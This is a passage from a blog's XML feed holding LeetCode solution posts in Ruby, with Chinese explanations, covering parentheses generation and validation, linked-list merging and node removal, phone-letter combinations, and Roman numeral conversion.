            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Generate Parentheses</title>
      <link href="/2018/03/10/Generate-Parentheses/"/>
      <url>/2018/03/10/Generate-Parentheses/</url>
      <content type="html"><![CDATA[<h1 id="22-Generate-Parentheses"><a href="#22-Generate-Parentheses" class="headerlink" title="22. Generate Parentheses"></a>22. Generate Parentheses</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given n pairs of parentheses, write a function to generate all combinations of well-formed parentheses.</p><p>For example, given n = 3, a solution set is:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &quot;((()))&quot;,</span><br><span class="line">  &quot;(()())&quot;,</span><br><span class="line">  &quot;(())()&quot;,</span><br><span class="line">  &quot;()(())&quot;,</span><br><span class="line">  &quot;()()()&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>提供<code>N</code>对括号，给出格式正确的组合。这个用递归来解决。</p><ul><li>先一直填充<code>N</code>个左括号，再填充N个右括号；</li><li>回退到<code>N-1</code>个左括号情况，先填充个右括号，在填充左括号；</li><li>一直回退到<code>1</code>个左括号情况，最后填充一个右括号即可。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_parenthesis</span><span class="params">(n)</span></span></span><br><span class="line">  @sol = []</span><br><span class="line">  generate(n*<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">""</span>)</span><br><span class="line">  <span class="keyword">return</span> @sol</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(n, i, open, par)</span></span></span><br><span class="line">  <span class="keyword">if</span>(n == i)</span><br><span class="line">    @sol &lt;&lt; par</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(open == <span class="number">0</span>)</span><br><span class="line">    generate(n, i+<span class="number">1</span>, open+<span class="number">1</span>, par + <span class="string">"("</span>)</span><br><span class="line">  <span class="keyword">elsif</span>(n-i == open)</span><br><span class="line">    generate(n, i+<span class="number">1</span>, open-<span class="number">1</span>, par + <span class="string">")"</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    generate(n, i+<span class="number">1</span>, open+<span class="number">1</span>, par + <span class="string">"("</span>)</span><br><span class="line">    generate(n, i+<span class="number">1</span>, open-<span class="number">1</span>, par + <span class="string">")"</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N!)</code></li><li>空间复杂度：<code>O(N!)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Merge Two Sorted Lists</title>
      <link href="/2018/03/09/Merge-Two-Sorted-Lists/"/>
      <url>/2018/03/09/Merge-Two-Sorted-Lists/</url>
      <content type="html"><![CDATA[<h1 id="21-Merge-Two-Sorted-Lists"><a href="#21-Merge-Two-Sorted-Lists" class="headerlink" title="21. Merge Two Sorted Lists"></a>21. Merge Two Sorted Lists</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>合并两个有序链表，很好处理。同时遍历两个链表的节点，比较节点大小，取小的节点，然后继续遍历，直到两个链表都遍历完。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; l1</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; l2</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_two_lists</span><span class="params">(l1, l2)</span></span></span><br><span class="line">  l = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  c1, c2, c3 = l1, l2, l</span><br><span class="line">  <span class="keyword">while</span> c1 <span class="keyword">or</span> c2</span><br><span class="line">    <span class="keyword">if</span> (c1 <span class="keyword">and</span> c2 <span class="keyword">and</span> c1.val &lt; c2.val) <span class="keyword">or</span> (c1 <span class="keyword">and</span> c2.<span class="literal">nil</span>?)</span><br><span class="line">      n = ListNode.new(c1.val)</span><br><span class="line">      c1 = c1.<span class="keyword">next</span></span><br><span class="line">    <span class="keyword">elsif</span> (c1 <span class="keyword">and</span> c2 <span class="keyword">and</span> c1.val &gt;= c2.val) <span class="keyword">or</span> (c2 <span class="keyword">and</span> c1.<span class="literal">nil</span>?)</span><br><span class="line">      n = ListNode.new(c2.val)</span><br><span class="line">      c2 = c2.<span class="keyword">next</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    c3.<span class="keyword">next</span> = n</span><br><span class="line">    c3 = n</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  l.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(N)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Valid Parentheses</title>
      <link href="/2018/03/08/Valid-Parentheses/"/>
      <url>/2018/03/08/Valid-Parentheses/</url>
      <content type="html"><![CDATA[<h1 id="20-Valid-Parentheses"><a href="#20-Valid-Parentheses" class="headerlink" title="20. Valid Parentheses"></a>20. Valid Parentheses</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string containing just the characters ‘(‘, ‘)’, ‘{‘, ‘}’, ‘[‘ and ‘]’, determine if the input string is valid.</p><p>An input string is valid if:</p><ul><li>Open brackets must be closed by the same type of brackets.</li><li>Open brackets must be closed in the correct order.</li><li>Note that an empty string is also considered valid.</li></ul><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;()&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;()[]&#123;&#125;&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;(]&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure></p><p>Example 4:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;([)]&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure></p><p>Example 5:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;&#123;[]&#125;&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>主要是利用栈数据结构的特性，遍历字符串：</p><ul><li>当遇到左括号时，压栈；</li><li>当遇到右括号时，弹栈。<br>最后判断栈是否为空即可。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(s)</span></span></span><br><span class="line">  stack = []</span><br><span class="line">  parens = &#123;</span><br><span class="line">    <span class="string">"&#125;"</span> =&gt; <span class="string">"&#123;"</span>,</span><br><span class="line">    <span class="string">"]"</span> =&gt; <span class="string">"["</span>,</span><br><span class="line">    <span class="string">")"</span> =&gt; <span class="string">"("</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  s.each_char <span class="keyword">do</span> <span class="params">|c|</span></span><br><span class="line">    <span class="keyword">if</span> parens.values.<span class="keyword">include</span>? c</span><br><span class="line">      stack &lt;&lt; c</span><br><span class="line">    <span class="keyword">elsif</span> parens.keys.<span class="keyword">include</span>? c</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> stack[-<span class="number">1</span>] == parens[c]</span><br><span class="line">      stack.pop</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  stack.empty?</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Remove Nth Node From End of List</title>
      <link href="/2018/03/07/Remove-Nth-Node-From-End-of-List/"/>
      <url>/2018/03/07/Remove-Nth-Node-From-End-of-List/</url>
      <content type="html"><![CDATA[<h1 id="19-Remove-Nth-Node-From-End-of-List"><a href="#19-Remove-Nth-Node-From-End-of-List" class="headerlink" title="19. Remove Nth Node From End of List"></a>19. Remove Nth Node From End of List</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a linked list, remove the n-th node from the end of list and return its head.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2.</span><br><span class="line"></span><br><span class="line">After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5.</span><br></pre></td></tr></table></figure></p><p>Note:</p><p>Given n will always be valid.</p><p>Follow up:</p><p>Could you do this in one pass?</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>使用两个指针，开始两个指针都指向head，然后让第一个指针先往前走N个节点，然后两个指针同时往前走。<br>当第一个指针走到末尾时，第二个指针的下一个节点就是要删除的节点。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_nth_from_end</span><span class="params">(head, n)</span></span></span><br><span class="line">  dummy = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  dummy.<span class="keyword">next</span> = head</span><br><span class="line">  first, second = dummy, dummy</span><br><span class="line">  (n + <span class="number">1</span>).times&#123; first = first.<span class="keyword">next</span> &#125;</span><br><span class="line">  <span class="keyword">while</span> first</span><br><span class="line">    first = first.<span class="keyword">next</span></span><br><span class="line">    second = second.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  second.<span class="keyword">next</span> = second.<span class="keyword">next</span>.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">return</span> dummy.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Letter Combinations of a Phone Number</title>
      <link href="/2018/03/06/Letter-Combinations-of-a-Phone-Number/"/>
      <url>/2018/03/06/Letter-Combinations-of-a-Phone-Number/</url>
      <content type="html"><![CDATA[<h1 id="17-Letter-Combinations-of-a-Phone-Number"><a href="#17-Letter-Combinations-of-a-Phone-Number" class="headerlink" title="17. Letter Combinations of a Phone Number"></a>17. Letter Combinations of a Phone Number</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string containing digits from 2-9 inclusive, return all possible letter combinations that the number could represent.</p><p>A mapping of digit to letters (just like on the telephone buttons) is given below. Note that 1 does not map to any letters.</p><p><img src="http://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Telephone-keypad2.svg/200px-Telephone-keypad2.svg.png" alt="Telephone-keypad2"></p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;23&quot;</span><br><span class="line">Output: [&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;].</span><br></pre></td></tr></table></figure></p><p>Note:<br>Although the above answer is in lexicographical order, your answer could be in any order you want.</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>主思路是用递归解决：</p><ul><li>当n = 1时，返回数组对应的所有字母；</li><li>当n &gt; 1时，在n - 1的结果上加上第n个数字对应的字母。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; digits</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">letter_combinations</span><span class="params">(digits)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> digits.length == <span class="number">0</span></span><br><span class="line">  h = [<span class="string">"abc"</span>, <span class="string">"def"</span>, <span class="string">"ghi"</span>, <span class="string">"jkl"</span>, <span class="string">"mno"</span>, <span class="string">"pqrs"</span>, <span class="string">"tuv"</span>, <span class="string">"wxyz"</span>]</span><br><span class="line">  <span class="keyword">if</span> digits.length == <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> h[digits[<span class="number">0</span>].to_i - <span class="number">2</span>].chars</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    comb = Array.new</span><br><span class="line">    previous = letter_combinations(digits[<span class="number">0</span>..-<span class="number">2</span>])</span><br><span class="line">    h[digits[-<span class="number">1</span>].to_i - <span class="number">2</span>].chars.each <span class="keyword">do</span> <span class="params">|char|</span></span><br><span class="line">      previous.map&#123; <span class="params">|p|</span> comb.push(p + char) &#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> comb</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(3^n)</code></li><li>空间复杂度：<code>O(3^n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Integer and Roman</title>
      <link href="/2018/03/05/Integer-and-Roman/"/>
      <url>/2018/03/05/Integer-and-Roman/</url>
      <content type="html"><![CDATA[<h1 id="Integer-and-Roman"><a href="#Integer-and-Roman" class="headerlink" title="Integer and Roman"></a>Integer and Roman</h1><h2 id="12-Integer-to-Roman"><a href="#12-Integer-to-Roman" class="headerlink" title="12. Integer to Roman"></a>12. Integer to Roman</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Roman numerals are represented by seven different symbols: I, V, X, L, C, D and M.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Symbol       Value</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure></p><p>For example, two is written as II in Roman numeral, just two one’s added together. Twelve is written as, XII, which is simply X + II. The number twenty seven is written as XXVII, which is XX + V + II.</p><p>Roman numerals are usually written largest to smallest from left to right. However, the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:</p><ul><li>I can be placed before V (5) and X (10) to make 4 and 9. </li><li>X can be placed before L (50) and C (100) to make 40 and 90. </li><li>C can be placed before D (500) and M (1000) to make 400 and 900.</li></ul><p>Given an integer, convert it to a roman numeral. Input is guaranteed to be within the range from 1 to 3999.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: &quot;III&quot;</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4</span><br><span class="line">Output: &quot;IV&quot;</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 9</span><br><span class="line">Output: &quot;IX&quot;</span><br></pre></td></tr></table></figure></p><p>Example 4:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 58</span><br><span class="line">Output: &quot;LVIII&quot;</span><br><span class="line">Explanation: C = 100, L = 50, XXX = 30 and III = 3.</span><br></pre></td></tr></table></figure></p><p>Example 5:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 1994</span><br><span class="line">Output: &quot;MCMXCIV&quot;</span><br><span class="line">Explanation: M = 1000, CM = 900, XC = 90 and IV = 4.</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>先生成十进制数和罗马数的对应表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">romans = [&quot;M&quot;,&quot;CM&quot;,&quot;D&quot;,&quot;CD&quot;,&quot;C&quot;,&quot;XC&quot;,&quot;L&quot;,&quot;XL&quot;,&quot;X&quot;,&quot;IX&quot;,&quot;V&quot;,&quot;IV&quot;,&quot;I&quot;]</span><br><span class="line">values = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1]</span><br></pre></td></tr></table></figure></p><p>拿到给定的数字后，就去遍历<code>values</code>，如果给定的数字比<code>values</code>当前的元素大，就减去当前元素。一直这样循环直到变为0。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; num</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int_to_roman</span><span class="params">(num)</span></span></span><br><span class="line">  romans = [<span class="string">"M"</span>,<span class="string">"CM"</span>,<span class="string">"D"</span>,<span class="string">"CD"</span>,<span class="string">"C"</span>,<span class="string">"XC"</span>,<span class="string">"L"</span>,<span class="string">"XL"</span>,<span class="string">"X"</span>,<span class="string">"IX"</span>,<span class="string">"V"</span>,<span class="string">"IV"</span>,<span class="string">"I"</span>]</span><br><span class="line">  values = [<span class="number">1000</span>, <span class="number">900</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">100</span>, <span class="number">90</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  index = <span class="number">0</span></span><br><span class="line">  str = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> num != <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &gt;= values[index]</span><br><span class="line">      num -= values[index]</span><br><span class="line">      str += romans[index]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code>，对应表的长度是固定的，主要看给定的数字大小；</li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="13-Roman-to-Integer"><a href="#13-Roman-to-Integer" class="headerlink" title="13. Roman to Integer"></a>13. Roman to Integer</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Roman numerals are represented by seven different symbols: I, V, X, L, C, D and M.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Symbol       Value</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure></p><p>For example, two is written as II in Roman numeral, just two one’s added together. Twelve is written as, XII, which is simply X + II. The number twenty seven is written as XXVII, which is XX + V + II.</p><p>Roman numerals are usually written largest to smallest from left to right. However, the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:</p><ul><li>I can be placed before V (5) and X (10) to make 4 and 9. </li><li>X can be placed before L (50) and C (100) to make 40 and 90. </li><li>C can be placed before D (500) and M (1000) to make 400 and 900.</li></ul><p>Given a roman numeral, convert it to an integer. Input is guaranteed to be within the range from 1 to 3999.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;III&quot;</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;IV&quot;</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;IX&quot;</span><br><span class="line">Output: 9</span><br></pre></td></tr></table></figure></p><p>Example 4:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;LVIII&quot;</span><br><span class="line">Output: 58</span><br><span class="line">Explanation: C = 100, L = 50, XXX = 30 and III = 3.</span><br></pre></td></tr></table></figure></p><p>Example 5:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;MCMXCIV&quot;</span><br><span class="line">Output: 1994</span><br><span class="line">Explanation: M = 1000, CM = 900, XC = 90 and IV = 4.</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>先构造对应表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &apos;I&apos; =&gt; 1, &apos;V&apos; =&gt; 5, &apos;X&apos; =&gt; 10, &apos;L&apos; =&gt; 50, 